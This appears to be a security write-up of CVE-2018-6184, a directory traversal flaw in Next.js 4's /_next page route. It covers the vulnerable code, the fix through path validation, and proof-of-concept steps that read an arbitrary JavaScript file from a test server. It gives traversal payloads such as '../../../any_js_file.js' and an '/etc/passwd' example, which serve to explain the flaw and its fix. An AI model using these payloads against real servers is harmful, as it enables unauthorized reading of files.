## CVE-2018-6184

### Introduction
ZEIT Next.js 4 before 4.2.3 has Directory Traversal under the `/_next` request namespace.
Allowing a remote attacker to read arbitrary JavaScript files on the target system.

### The Vulnerability
To boost performance Next.js support code splitting. (e.g loading only the about.js JavaScript on the /about page).
In order for this to work, the server needs to dynamically load the right file for the requested page.
The endpoint responsible for code splitting support is `/_next/:buildId/page/:path*` it resives an array of paths and resolve the requested page JavaScript file.

An attacker could trick the server into loading arbitrary JavaScript files using path traversal after `/_next/MY_BUILD_ID/page/../../../any_js_file.js`

```js
// server/render.js
export async function renderScript (req, res, page, opts) {
  try {
    const dist = getConfig(opts.dir).distDir
    // An attacker can controll page, this is what made the path traversal possible.
    const path = join(opts.dir, dist, 'bundles', 'pages', page)
    const realPath = await resolvePath(path)
    await serveStatic(req, res, realPath)
  } catch (err) {
    if (err.code === 'ENOENT') {
      renderScriptError(req, res, page, err, {}, opts)
      return
    }

    throw err
  }
}
```

### The Fix
The vulnerable route `/_next/:buildId/page/:path*` in `server/index.js@defineRoutes` was changed.

```js
// attacker has full controll over this, payload-> /../../../../any_js_file.js
const paths = params.path || ['']
const page = `/${paths.join('/')}`.replace('.js', '')
if (!this.handleBuildId(params.buildId, res)) {
    //...
}
await renderScript(req, res, page, this.renderOpts)
```

The vulnerability was fixed by using the `serveStatic` method insted of `renderScript`, this method validates the path using the `isServeableUrl` method.

```js
isServeableUrl (path) {
    const resolved = resolve(path)
    if (
      resolved.indexOf(join(this.dir, this.dist) + sep) !== 0 &&
      resolved.indexOf(join(this.dir, 'static') + sep) !== 0
    ) {
      // Seems like the user is trying to traverse the filesystem.
      return false
    }

    return true
}
```

As you can see above, we first resolve the path using `path.resolve`. e.g if we give it `"../../../../../etc/passwd"` as input it will return `"/etc/passwd"`.
After that the method check whether or not the resolved path starts with system constants (`this.dir/this.dist`,`this.dir/static`) 
If the check fails we do not serve the requested file.

### Proof of concept
```console
cd ./Poc/
# setup our vulnerable server
npm run build
npm run start
# run the exploit
node ./exploit.js
# expected output - the content of npm/lib/get.js file
statusCode: 200

module.exports = get

get.usage = 'npm get <key> <value> (See `npm config`)'

var npm = require('./npm.js')

get.completion = npm.commands.config.completion

function get (args, cb) {
  npm.commands.config(['get'].concat(args), cb)
}
```

### Refrences
A. https://github.com/zeit/next.js/commit/bba744d3faa2e91bc3a3c934e8563553c430b2a2